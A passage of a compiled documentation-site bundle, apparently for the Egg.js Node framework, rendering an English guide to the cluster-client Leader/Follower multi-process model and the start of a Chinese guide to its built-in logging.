result in n times (n = number of Worker processes) connections being created."),r.a.createElement(o["a"],{code:"+--------+   +--------+\n| Client |   | Client |   ... n\n+--------+   +--------+\n    |  \\     /   |\n    |    \\ /     |        n * m links\n    |    / \\     |\n    |  /     \\   |\n+--------+   +--------+\n| Server |   | Server |   ... m\n+--------+   +--------+",lang:"bash"}),r.a.createElement("p",null,"In order to reuse persistent connections as much as possible (because they are very valuable resources for server), we put them into the Agent process to maintain, and then we transmit data to each Worker via messenger. It's feasible but we often need to write many codes to encapsulate the interface and realize data transmission, which is very troublesome."),r.a.createElement("p",null,"In addition, it's relatively inefficient to transmit data via messenger, since messenger will do the transmission through the Master; In case IPC channel goes wrong, it would probably break Master process down."),r.a.createElement("p",null,"So is there any better way? The answer is: YES! We provide a new type of model to reduce the complexity of this type of client encapsulation. The new Model bypasses the Master by establishing a direct socket between Agent and Worker. And as an external interface, Agent maintains shared connection among multiple Worker processes."),r.a.createElement("h2",{id:"core-idea"},r.a.createElement(l["AnchorLink"],{to:"#core-idea","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Core Idea"),r.a.createElement("ul",null,r.a.createElement("li",null,"Inspired by the ",r.a.createElement(l["Link"],{to:"https://www.dre.vanderbilt.edu/~schmidt/PDF/lf.pdf"},"Leader/Follower")," model."),r.a.createElement("li",null,"The client is divided into two roles:",r.a.createElement("ul",null,r.a.createElement("li",null,"Leader: Be responsible for maintaining the connection with the remote server, only one Leader for the same type of client."),r.a.createElement("li",null,"Follower: Delegate specific operations to the Leader. A common way is Subscribe-Model (let the Leader interact with remote server and wait for its return)."))),r.a.createElement("li",null,"How to determine who Leader is, who Follower is? There are two modes:",r.a.createElement("ul",null,r.a.createElement("li",null,"Free competition mode: clients determine the Leader by the competition of the local port when start up. For example: every one tries to monitor port 7777, and finally the only one instance who seizes it will become Leader, the rest will be Followers."),r.a.createElement("li",null,"Mandatory mode: the framework designates a Leader and the rest are Followers."))),r.a.createElement("li",null,"we use mandatory mode inside the framework. The Leader can only be created inside the Agent, which is also in line with our positioning of the Agent."),r.a.createElement("li",null,"When the framework starts up, Master will randomly select an available port as the communication port monitored by the Cluster Client, and passes it by parameter to Agent and App Worker."),r.a.createElement("li",null,"Leader communicates with Follower through direct socket connection (through communication port), no longer needs Master to transit.")),r.a.createElement("p",null,"Under the new mode, the client's communication is as follows:"),r.a.createElement(o["a"],{code:"+-------+\n             | start |\n             +---+---+\n                 |\n        +--------+---------+\n      __| port competition |__\nwin /   +------------------+  \\ lose\n   /                           \\\n+---------------+     tcp conn     +-------------------+\n| Leader(Agent) |<----------------\x3e| Follower(Worker1) |\n+---------------+                  +-------------------+\n    |            \\ tcp conn\n    |             \\\n+--------+         +-------------------+\n| Client |         | Follower(Worker2) |\n+--------+         +-------------------+",lang:"js"}),r.a.createElement("h2",{id:"client-interface-type-abstraction"},r.a.createElement(l["AnchorLink"],{to:"#client-interface-type-abstraction","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Client Interface Type Abstraction"),r.a.createElement("p",null,"We abstract the client interface into the following two broad categories, which is also a specification of the client interface. For clients that are in line with norms, we can automatically wrap it as Leader / Follower mode."),r.a.createElement("ul",null,r.a.createElement("li",null,"Subscribe / Publish Mode:",r.a.createElement("ul",null,r.a.createElement("li",null,"The ",r.a.createElement("code",null,"subscribe(info, listener)")," interface contains two parameters. The first one is the information subscribed and the second one is callback function for subscribe."),r.a.createElement("li",null,"The ",r.a.createElement("code",null,"publish(info)")," interface contains a parameter which is the information subscribed."))),r.a.createElement("li",null,"Invoke Mode, supports three styles of interface: callback, promise and generator function, but generator function is recommended.")),r.a.createElement("p",null,"Client example"),r.a.createElement(o["a"],{code:"const Base = require('sdk-base');\n\nclass Client extends Base {\n  constructor(options) {\n    super(options); // remember to invoke ready after initialization is successful\n    this.ready(true);\n  }\n  /**\n   * Subscribe\n   *\n   * @param {Object} info - subscription information (a JSON object, try not to include attributes such as Function, Buffer, Date)\n   * @param {Function} listener - monitoring callback function, receives a parameter as the result of monitoring\n   */\n\n  subscribe(info, listener) {\n    // ...\n  }\n  /**\n   * Publish\n   *\n   * @param {Object} info - publishing information, which is similar to that of subscribe described above\n   */\n\n  publish(info) {\n    // ...\n  }\n  /**\n   * Get data (invoke)\n   *\n   * @param {String} id - id\n   * @return {Object} result\n   */\n\n  async getData(id) {\n    // ...\n  }\n}",lang:"js"}),r.a.createElement("h2",{id:"exception-handling"},r.a.createElement(l["AnchorLink"],{to:"#exception-handling","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Exception Handling"),r.a.createElement("ul",null,r.a.createElement("li",null,'If Leader "dies", a new round of port contention will be triggered. The instance which seizes the port will be elected as the new Leader.'),r.a.createElement("li",null,"To ensure that the channel between Leader and Follower is healthy, heartbeat mechanism needs to be introduced. If the Follower does not send a heartbeat packet within a fixed time, the Leader will proactively disconnect from the Follower, which will trigger the reinitialization of Follower.")),r.a.createElement("h2",{id:"protocol-and-time-series-to-invoke"},r.a.createElement(l["AnchorLink"],{to:"#protocol-and-time-series-to-invoke","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Protocol and Time Series to Invoke"),r.a.createElement("p",null,"Leader and Follower exchange data via the following protocols:"),r.a.createElement(o["a"],{code:"0       1       2               4                                                              12\n +-------+-------+---------------+---------------------------------------------------------------+\n |version|req/res|    reserved   |                          request id                           |\n +-------------------------------+-------------------------------+-------------------------------+\n |           timeout             |   connection object length    |   application object length   |\n +-------------------------------+---------------------------------------------------------------+\n |         conn object (JSON format)  ...                    |            app object             |\n +-----------------------------------------------------------+                                   |\n |                                          ...                                                  |\n +-----------------------------------------------------------------------------------------------+",lang:"js"}),r.a.createElement("ol",null,r.a.createElement("li",null,"On the communication port Leader starts a Local Server, via which all Leaders / Followers communicate."),r.a.createElement("li",null,"After Follower connects Local Server, it will firstly send a register channel packet (introduction of the channel concept is to distinguish between different types of clients)."),r.a.createElement("li",null,"Local Server will assign Follower to a specified Leader (match based on client type)."),r.a.createElement("li",null,"Follower sends requests to Leader to subscribe and publish."),r.a.createElement("li",null,"Leader notifies Follower through the subscribe result packet when the subscription data changes."),r.a.createElement("li",null,"Follower sends a call request to the Leader. The Leader executes a corresponding operation after receiving, and returns the result.")),r.a.createElement(o["a"],{code:"+----------+             +---------------+          +---------+\n | Follower |             |  Local Server |          |  Leader |\n +----------+             +---------------+          +---------+\n      |     register channel     |       assign to        |\n      + -----------------------\x3e |  --------------------\x3e |\n      |                          |                        |\n      |                                subscribe          |\n      + ------------------------------------------------\x3e |\n      |                                 publish           |\n      + ------------------------------------------------\x3e |\n      |                                                   |\n      |       subscribe result                            |\n      | <------------------------------------------------ +\n      |                                                   |\n      |                                 invoke            |\n      + ------------------------------------------------\x3e |\n      |          invoke result                            |\n      | <------------------------------------------------ +\n      |                                                   |",lang:"js"}),r.a.createElement("h2",{id:"specific-usage"},r.a.createElement(l["AnchorLink"],{to:"#specific-usage","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Specific Usage"),r.a.createElement("p",null,"In the following I will use a simple example to introduce how to make a client support Leader / Follower mode in the framework."),r.a.createElement("ul",null,r.a.createElement("li",null,"The first step, our client is best to meet the interface conventions mentioned above, for example:")),r.a.createElement(o["a"],{code:"// registry_client.js\nconst URL = require('url');\nconst Base = require('sdk-base');\n\nclass RegistryClient extends Base {\n  constructor(options) {\n    super({\n      // Specify a method for asynchronous start\n      initMethod: 'init',\n    });\n    this._options = options;\n    this._registered = new Map();\n  }\n  /**\n   * Start logic\n   */\n\n  async init() {\n    this.ready(true);\n  }\n  /**\n   * Get configuration\n   * @param {String} dataId - the dataId\n   * @return {Object} configuration\n   */\n\n  async getConfig(dataId) {\n    return this._registered.get(dataId);\n  }\n  /**\n   * Subscribe\n   * @param {Object} reg\n   *   - {String} dataId - the dataId\n   * @param {Function} listener - the listener\n   */\n\n  subscribe(reg, listener) {\n    const key = reg.dataId;\n    this.on(key, listener);\n\n    const data = this._registered.get(key);\n    if (data) {\n      process.nextTick(() => listener(data));\n    }\n  }\n  /**\n   * publish\n   * @param {Object} reg\n   *   - {String} dataId - the dataId\n   *   - {String} publishData - the publish data\n   */\n\n  publish(reg) {\n    const key = reg.dataId;\n    let changed = false;\n\n    if (this._registered.has(key)) {\n      const arr = this._registered.get(key);\n      if (arr.indexOf(reg.publishData) === -1) {\n        changed = true;\n        arr.push(reg.publishData);\n      }\n    } else {\n      changed = true;\n      this._registered.set(key, [reg.publishData]);\n    }\n    if (changed) {\n      this.emit(\n        key,\n        this._registered.get(key).map((url) => URL.parse(url, true)),\n      );\n    }\n  }\n}\n\nmodule.exports = RegistryClient;",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"The second step is to encapsulate the ",r.a.createElement("code",null,"RegistryClient")," using the ",r.a.createElement("code",null,"agent.cluster")," interface:")),r.a.createElement(o["a"],{code:"// agent.js\nconst RegistryClient = require('registry_client');\n\nmodule.exports = (agent) => {\n  // encapsulate and instantiate RegistryClient\n  agent.registryClient = agent\n    .cluster(RegistryClient) // parameter of create method is the parameter of RegistryClient constructor\n    .create({});\n\n  agent.beforeStart(async () => {\n    await agent.registryClient.ready();\n    agent.coreLogger.info('registry client is ready');\n  });\n};",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"The third step, use the ",r.a.createElement("code",null,"app.cluster")," interface to encapsulate ",r.a.createElement("code",null,"RegistryClient"),":")),r.a.createElement(o["a"],{code:"// app.js\nconst RegistryClient = require('registry_client');\n\nmodule.exports = (app) => {\n  app.registryClient = app.cluster(RegistryClient).create({});\n  app.beforeStart(async () => {\n    await app.registryClient.ready();\n    app.coreLogger.info('registry client is ready');\n\n    // invoke subscribe to subscribe\n    app.registryClient.subscribe(\n      {\n        dataId: 'demo.DemoService',\n      },\n      (val) => {\n        // ...\n      },\n    );\n\n    // invoke publish to publsih data\n    app.registryClient.publish({\n      dataId: 'demo.DemoService',\n      publishData: 'xxx',\n    });\n\n    // invoke getConfig interface\n    const res = await app.registryClient.getConfig('demo.DemoService');\n    console.log(res);\n  });\n};",lang:"js"}),r.a.createElement("p",null,"Isn't it so simple?"),r.a.createElement("p",null,"Of course, if your client is not so \u300estandard\u300f, then you may need to use some other APIs, for example, your subscription function is not named ",r.a.createElement("code",null,"subscribe"),", but ",r.a.createElement("code",null,"sub"),":"),r.a.createElement(o["a"],{code:"class MockClient extends Base {\n  constructor(options) {\n    super({\n      initMethod: 'init',\n    });\n    this._options = options;\n    this._registered = new Map();\n  }\n\n  async init() {\n    this.ready(true);\n  }\n\n  sub(info, listener) {\n    const key = reg.dataId;\n    this.on(key, listener);\n\n    const data = this._registered.get(key);\n    if (data) {\n      process.nextTick(() => listener(data));\n    }\n  }\n\n  ...\n}",lang:"js"}),r.a.createElement("p",null,"You need to set it manually with the ",r.a.createElement("code",null,"delegate")," API:"),r.a.createElement(o["a"],{code:"// agent.js\nmodule.exports = (agent) => {\n  agent.mockClient = agent\n    .cluster(MockClient)\n    // delegate sub to logic of subscribe\n    .delegate('sub', 'subscribe')\n    .create();\n\n  agent.beforeStart(async () => {\n    await agent.mockClient.ready();\n  });\n};",lang:"js"}),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.mockClient = app\n    .cluster(MockClient)\n    // delegate sub to subscribe logic\n    .delegate('sub', 'subscribe')\n    .create();\n\n  app.beforeStart(async () => {\n    await app.mockClient.ready();\n\n    app.sub({ id: 'test-id' }, (val) => {\n      // put your code here\n    });\n  });\n};",lang:"js"}),r.a.createElement("p",null,"We've already known that using ",r.a.createElement("code",null,"cluster-client")," allows us to develop a \u300epure\u300f RegistryClient without understanding the multi-process model. We can only focus on interacting with server, and use the ",r.a.createElement("code",null,"cluster-client")," with a simple wrap to get a ",r.a.createElement("code",null,"ClusterClient")," which supports multi-process model. The ",r.a.createElement("code",null,"RegistryClient")," here is actually a ",r.a.createElement("code",null,"DataClient")," that is specifically responsible for data communication with remote service."),r.a.createElement("p",null,"You may have noticed that the ",r.a.createElement("code",null,"ClusterClient")," brings with several constraints at the same time. If you want to expose the same approach to each process, ",r.a.createElement("code",null,"RegistryClient")," can only support sub/pub mode and asynchronous API calls. Because all interactions in multi-process model must use socket communications, under which it is bound to bring this constraint."),r.a.createElement("p",null,"Suppose we want to realize a synchronous ",r.a.createElement("code",null,"get")," method. Put subscribed data directly into memory and use the ",r.a.createElement("code",null,"get")," method to return data directly. How to achieve it? The real situation may be more complicated."),r.a.createElement("p",null,"Here, we introduce an ",r.a.createElement("code",null,"APIClient")," best practice. For modules that have requirements of synchronous API such as reading cached data, an ",r.a.createElement("code",null,"APIClient")," is encapsulated base on RegistryClient to implement these APIs that are not related to interaction with the remote server. The ",r.a.createElement("code",null,"APIClient")," instance is exposed to the user."),r.a.createElement("p",null,"In ",r.a.createElement("code",null,"APIClient")," internal implementation:"),r.a.createElement("ul",null,r.a.createElement("li",null,"To obtain data asynchronously, invoke RegistryClient's API base on ClusterClient."),r.a.createElement("li",null,"Interfaces that are unrelated to server, such as synchronous call, are to be implemented in ",r.a.createElement("code",null,"APIClient"),". Since ClusterClient's APIs have flushed multi-process differences, there is no need to concern about multi-process model when calls to RegistryClient during developing ",r.a.createElement("code",null,"APIClient"),".")),r.a.createElement("p",null,"For example, add a synchronous get method with buffer in the ",r.a.createElement("code",null,"APIClient")," module:"),r.a.createElement(o["a"],{code:"// some-client/index.js\nconst cluster = require('cluster-client');\nconst RegistryClient = require('./registry_client');\n\nclass APIClient extends Base {\n  constructor(options) {\n    super(options); // options.cluster is used to pass app.cluster to Egg's plugin\n\n    this._client = (options.cluster || cluster)(RegistryClient).create(options);\n    this._client.ready(() => this.ready(true));\n\n    this._cache = {};\n\n    // subMap:\n    // {\n    //   foo: reg1,\n    //   bar: reg2,\n    // }\n    const subMap = options.subMap;\n\n    for (const key in subMap) {\n      this.subscribe(subMap[key], (value) => {\n        this._cache[key] = value;\n      });\n    }\n  }\n\n  subscribe(reg, listener) {\n    this._client.subscribe(reg, listener);\n  }\n\n  publish(reg) {\n    this._client.publish(reg);\n  }\n\n  get(key) {\n    return this._cache[key];\n  }\n}\n\n// at last the module exposes this APIClient\nmodule.exports = APIClient;",lang:"js"}),r.a.createElement("p",null,"Then we can use this module like this:"),r.a.createElement(o["a"],{code:"// app.js || agent.js\nconst APIClient = require('some-client'); // the module above\nmodule.exports = app => {\n  const config = app.config.apiClient;\n  app.apiClient = new APIClient(Object.assign({}, config, { cluster: app.cluster });\n  app.beforeStart(async () => {\n    await app.apiClient.ready();\n  });\n};\n\n// config.${env}.js\nexports.apiClient = {\n  subMap: {\n    foo: {\n      id: '',\n    },\n    // bar...\n  }\n};",lang:"js"}),r.a.createElement("p",null,"To make it easy for you to encapsulate ",r.a.createElement("code",null,"APIClient"),", we provide an",r.a.createElement("code",null," APIClientBase")," base class in the ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/cluster-client"},"cluster-client")," module. Then ",r.a.createElement("code",null,"APIClient")," above can be rewritten as:"),r.a.createElement(o["a"],{code:"const APIClientBase = require('cluster-client').APIClientBase;\nconst RegistryClient = require('./registry_client');\n\nclass APIClient extends APIClientBase {\n  // return the original client class\n  get DataClient() {\n    return RegistryClient;\n  } // used to set the cluster-client related parameters, equivalent to the second parameter of the cluster method\n\n  get clusterOptions() {\n    return {\n      responseTimeout: 120 * 1000,\n    };\n  }\n\n  subscribe(reg, listener) {\n    this._client.subscribe(reg, listener);\n  }\n\n  publish(reg) {\n    this._client.publish(reg);\n  }\n\n  get(key) {\n    return this._cache[key];\n  }\n}",lang:"js"}),r.a.createElement("p",null,"in conclusion:"),r.a.createElement(o["a"],{code:"+------------------------------------------------+\n| APIClient                                      |\n|       +----------------------------------------|\n|       | ClusterClient                          |\n|       |      +---------------------------------|\n|       |      | RegistryClient                  |\n+------------------------------------------------+",lang:"bash"}),r.a.createElement("ul",null,r.a.createElement("li",null,"RegistryClient - responsible for communicating with remote service, to access data, supports for asynchronous APIs only, and does't care about multi-process model."),r.a.createElement("li",null,"ClusterClient - a client instance that is simply wrapped by the ",r.a.createElement("code",null,"cluster-client")," module and is responsible for automatically flushing differences in multi-process model."),r.a.createElement("li",null,"APIClient - internally calls ",r.a.createElement("code",null,"ClusterClient")," to synchronize data, without the need to concern about multi-process model and is the final exposed module for users. APIs are exposed Through this, and support for synchronization and asynchronization.")),r.a.createElement("p",null,"Students who are interested may have look at ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/issues/322"},"enhanced multi-process development model")," discussion process."),r.a.createElement("h2",{id:"the-configuration-items-related-to-cluster-client-in-the-framework"},r.a.createElement(l["AnchorLink"],{to:"#the-configuration-items-related-to-cluster-client-in-the-framework","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"The Configuration Items Related to Cluster-Client in the Framework"),r.a.createElement(o["a"],{code:"/**\n * @property {Number} responseTimeout - response timeout, default is 60000\n * @property {Transcode} [transcode]\n *   - {Function} encode - custom serialize method\n *   - {Function} decode - custom deserialize method\n */\nconfig.clusterClient = {\n  responseTimeout: 60000,\n};",lang:"js"}),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"Configuration Items"),r.a.createElement("th",null,"Type"),r.a.createElement("th",null,"Default"),r.a.createElement("th",null,"Description"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"responseTimeout"),r.a.createElement("td",null,"number"),r.a.createElement("td",null,"60000 (one minute)"),r.a.createElement("td",null,"Global interprocess communication timeout, you cannot set too short, because the proxy interface itself has a timeout setting")),r.a.createElement("tr",null,r.a.createElement("td",null,"transcode"),r.a.createElement("td",null,"function"),r.a.createElement("td",null,"N/A"),r.a.createElement("td",null,"Serialization of interprocess communication, by default ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/serialize-json"},"serialize-json")," (set up manually is not recommended)")))),r.a.createElement("p",null,"The above is about global configuration. If you want to do a separate setting for a client:"),r.a.createElement("ul",null,r.a.createElement("li",null,"You can override by setting the second argument ",r.a.createElement("code",null,"options")," in ",r.a.createElement("code",null,"app/agent.cluster(ClientClass, options)"),":")),r.a.createElement(o["a"],{code:"app.registryClient = app\n  .cluster(RegistryClient, {\n    responseTimeout: 120 * 1000, // the parameters passing here are related to cluster-client\n  })\n  .create({\n    // here are parameters required by RegistryClient\n  });",lang:"js"}),r.a.createElement("ul",null,r.a.createElement("li",null,"You can also override the ",r.a.createElement("code",null,"getter")," attribute of ",r.a.createElement("code",null,"clusterOptions")," in ",r.a.createElement("code",null,"APIClientBase"),":")),r.a.createElement(o["a"],{code:"const APIClientBase = require('cluster-client').APIClientBase;\nconst RegistryClient = require('./registry_client');\n\nclass APIClient extends APIClientBase {\n  get DataClient() {\n    return RegistryClient;\n  }\n\n  get clusterOptions() {\n    return {\n      responseTimeout: 120 * 1000,\n    };\n  }\n\n  // ...\n}\n\nmodule.exports = APIClient;",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(c,{demos:n})}},NNgN:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u65e5\u5fd7\u5bf9\u4e8e Web \u5f00\u53d1\u7684\u91cd\u8981\u6027\u6bcb\u5eb8\u7f6e\u7591\uff0c\u5b83\u5bf9\u4e8e\u76d1\u63a7\u5e94\u7528\u7684\u8fd0\u884c\u72b6\u6001\u3001\u95ee\u9898\u6392\u67e5\u7b49\u90fd\u6709\u975e\u5e38\u91cd\u8981\u7684\u610f\u4e49\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u4e86\u5f3a\u5927\u7684\u4f01\u4e1a\u7ea7\u65e5\u5fd7\u652f\u6301\uff0c\u7531 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-logger"},"egg-logger")," \u6a21\u5757\u63d0\u4f9b\u3002"),r.a.createElement("p",null,"\u4e3b\u8981\u7279\u6027\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u65e5\u5fd7\u5206\u7ea7"),r.a.createElement("li",null,"\u7edf\u4e00\u9519\u8bef\u65e5\u5fd7\uff0c\u6240\u6709 logger \u4e2d\u4f7f\u7528 ",r.a.createElement("code",null,".error()")," \u6253\u5370\u7684 ",r.a.createElement("code",null,"ERROR")," \u7ea7\u522b\u65e5\u5fd7\u90fd\u4f1a\u6253\u5370\u5230\u7edf\u4e00\u7684\u9519\u8bef\u65e5\u5fd7\u6587\u4ef6\u4e2d\uff0c\u4fbf\u4e8e\u8ffd\u8e2a"),r.a.createElement("li",null,"\u542f\u52a8\u65e5\u5fd7\u548c\u8fd0\u884c\u65e5\u5fd7\u5206\u79bb"),r.a.createElement("li",null,"\u81ea\u5b9a\u4e49\u65e5\u5fd7"),r.a.createElement("li",null,"\u591a\u8fdb\u7a0b\u65e5\u5fd7"),r.a.createElement("li",null,"\u81ea\u52a8\u5207\u5272\u65e5\u5fd7"),r.a.createElement("li",null,"\u9ad8\u6027\u80fd")),r.a.createElement("h2",{id:"\u65e5\u5fd7\u8def\u5f84"},r.a.createElement(l["AnchorLink"],{to:"#\u65e5\u5fd7\u8def\u5f84","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u65e5\u5fd7\u8def\u5f84"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6240\u6709\u65e5\u5fd7\u6587\u4ef6\u9ed8\u8ba4\u90fd\u653e\u5728 ",r.a.createElement("code",null,"$","{","appInfo.root","}","/logs/$","{","appInfo.name","}")," \u8def\u5f84\u4e0b\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"/home/admin/logs/example-app"),"\u3002"),r.a.createElement("li",null,"\u5728\u672c\u5730\u5f00\u53d1\u73af\u5883 (env: local) \u548c\u5355\u5143\u6d4b\u8bd5\u73af\u5883 (env: unittest)\uff0c\u4e3a\u4e86\u907f\u514d\u51b2\u7a81\u4ee5\u53ca\u96c6\u4e2d\u7ba1\u7406\uff0c\u65e5\u5fd7\u4f1a\u6253\u5370\u5728\u9879\u76ee\u76ee\u5f55\u4e0b\u7684 logs \u76ee\u5f55\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"/path/to/example-app/logs/example-app"),"\u3002")),r.a.createElement("p",null,"\u5982\u679c\u60f3\u81ea\u5b9a\u4e49\u65e5\u5fd7\u8def\u5f84\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nexports.logger = {\n  dir: '/path/to/your/custom/log/dir',\n};",lang:"js"}),r.a.createElement("h2",{id:"\u65e5\u5fd7\u5206\u7c7b"},r.a.createElement(l["AnchorLink"],{to:"#\u65e5\u5fd7\u5206\u7c7b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u65e5\u5fd7\u5206\u7c7b"),r.a.createElement("p",null,"\u6846\u67b6\u5185\u7f6e\u4e86\u51e0\u79cd\u65e5\u5fd7\uff0c\u5206\u522b\u5728\u4e0d\u540c\u7684\u573a\u666f\u4e0b\u4f7f\u7528\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"appLogger ",r.a.createElement("code",null,"$","{","appInfo.name","}","-web.log"),"\uff0c\u4f8b\u5982 ",r.a.createElement("code",null,"example-app-web.log"),"\uff0c\u5e94\u7528\u76f8\u5173\u65e5\u5fd7\uff0c\u4f9b\u5e94\u7528\u5f00\u53d1\u8005\u4f7f\u7528\u7684\u65e5\u5fd7\u3002\u6211\u4eec\u5728\u7edd\u5927\u6570\u60c5\u51b5\u4e0b\u90fd\u5728\u4f7f\u7528\u5b83\u3002"),r.a.createElement("li",null,"coreLogger ",r.a.createElement("code",null,"egg-web.log")," \u6846\u67b6\u5185\u6838\u3001\u63d2\u4ef6\u65e5\u5fd7\u3002"),r.a.createElement("li",null,"errorLogger ",r.a.createElement("code",null,"common-error.log")," \u5b9e\u9645\u4e00\u822c\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528\u5b83\uff0c\u4efb\u4f55 logger \u7684 ",r.a.createElement("code",null,".error()")," \u8c03\u7528\u8f93\u51fa\u7684\u65e5\u5fd7\u90fd\u4f1a\u91cd\u5b9a\u5411\u5230\u8fd9\u91cc\uff0c\u91cd\u70b9\u901a\u8fc7\u67e5\u770b\u6b64\u65e5\u5fd7\u5b9a\u4f4d\u5f02\u5e38\u3002"),r.a.createElement("li",null,"agentLogger ",r.a.createElement("code",null,"egg-agent.log")," agent \u8fdb\u7a0b\u65e5\u5fd7\uff0c\u6846\u67b6\u548c\u4f7f\u7528\u5230 agent \u8fdb\u7a0b\u6267\u884c\u4efb\u52a1\u7684\u63d2\u4ef6\u4f1a\u6253\u5370\u4e00\u4e9b\u65e5\u5fd7\u5230\u8fd9\u91cc\u3002")),r.a.createElement("p",null,"\u5982\u679c\u60f3\u81ea\u5b9a\u4e49\u4ee5\u4e0a\u65e5\u5fd7\u6587\u4ef6\u540d\u79f0\uff0c\u53ef\u4ee5\u5728 config \u6587\u4ef6\u4e2d\u8986\u76d6\u9ed8\u8ba4\u503c\uff1a"),r.a.createElement(o["a"],{code:"// config/config.${env}.js\nmodule.exports = (appInfo) => {\n  return {\n    logger: {\n      appLogName: `${appInfo.name}-web.log`,\n      coreLogName: 'egg-web.log',\n      agentLogName: 'egg-agent.log',\n      errorLogName: 'common-error.log',\n    },\n  };\n};",lang:"js"}),r.a.createElement("h2",{id:"\u5982\u4f55\u6253\u5370\u65e5\u5fd7"},r.a.createElement(l["AnchorLink"],{to:"#\u5982\u4f55\u6253\u5370\u65e5\u5fd7","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5982\u4f55\u6253\u5370\u65e5\u5fd7"),r.a.createElement("h3",{id:"context-logger"},r.a.createElement(l["AnchorLink"],{to:"#context-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Context Logger"),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u5728\u5904\u7406\u8bf7\u6c42\u65f6\u9700\u8981\u6253\u5370\u65e5\u5fd7\uff0c\u8fd9\u65f6\u5019\u4f7f\u7528 Context Logger\uff0c\u7528\u4e8e\u8bb0\u5f55 Web \u884c\u4e3a\u76f8\u5173\u7684\u65e5\u5fd7\u3002"),r.a.createElement("p",null,"\u6bcf\u884c\u65e5\u5fd7\u4f1a\u81ea\u52a8\u8bb0\u5f55\u4e0a\u5f53\u524d\u8bf7\u6c42\u7684\u4e00\u4e9b\u57fa\u672c\u4fe1\u606f\uff0c \u5982 ",r.a.createElement("code",null,"[$userId/$ip/$traceId/$","{","cost","}","ms $method $url]"),"\u3002"),r.a.createElement(o["a"],{code:"ctx.logger.debug('debug info');\nctx.logger.info('some request data: %j', ctx.request.body);\nctx.logger.warn('WARNNING!!!!');\n\n// \u9519\u8bef\u65e5\u5fd7\u8bb0\u5f55\uff0c\u76f4\u63a5\u4f1a\u5c06\u9519\u8bef\u65e5\u5fd7\u5b8c\u6574\u5806\u6808\u4fe1\u606f\u8bb0\u5f55\u4e0b\u6765\uff0c\u5e76\u4e14\u8f93\u51fa\u5230 errorLog \u4e2d\n// \u4e3a\u4e86\u4fdd\u8bc1\u5f02\u5e38\u53ef\u8ffd\u8e2a\uff0c\u5fc5\u987b\u4fdd\u8bc1\u6240\u6709\u629b\u51fa\u7684\u5f02\u5e38\u90fd\u662f Error \u7c7b\u578b\uff0c\u56e0\u4e3a\u53ea\u6709 Error \u7c7b\u578b\u624d\u4f1a\u5e26\u4e0a\u5806\u6808\u4fe1\u606f\uff0c\u5b9a\u4f4d\u5230\u95ee\u9898\u3002\nctx.logger.error(new Error('whoops'));",lang:"js"}),r.a.createElement("p",null,"\u5bf9\u4e8e\u6846\u67b6\u5f00\u53d1\u8005\u548c\u63d2\u4ef6\u5f00\u53d1\u8005\u4f1a\u4f7f\u7528\u5230\u7684 Context Logger \u8fd8\u6709 ",r.a.createElement("code",null,"ctx.coreLogger"),"\u3002"),r.a.createElement("p",null,"\u4f8b\u5982"),r.a.createElement(o["a"],{code:"ctx.coreLogger.info('info');",lang:"js"}),r.a.createElement("h3",{id:"app-logger"},r.a.createElement(l["AnchorLink"],{to:"#app-logger","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"App Logger"),r.a.createElement("p",null,"\u5982\u679c\u6211\u4eec\u60f3\u505a\u4e00\u4e9b\u5e94\u7528\u7ea7\u522b\u7684\u65e5\u5fd7\u8bb0\u5f55\uff0c\u5982\u8bb0\u5f55\u542f\u52a8\u9636\u6bb5\u7684\u4e00\u4e9b\u6570\u636e\u4fe1\u606f\uff0c\u53ef\u4ee5\u901a\u8fc7 App Logger \u6765\u5b8c\u6210\u3002"),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.logger.debug('debug info');\n  app.logger.info('\u542f\u52a8\u8017\u65f6 %d ms', Date.now() - start);\n  app.logger.warn('warning!');\n\n  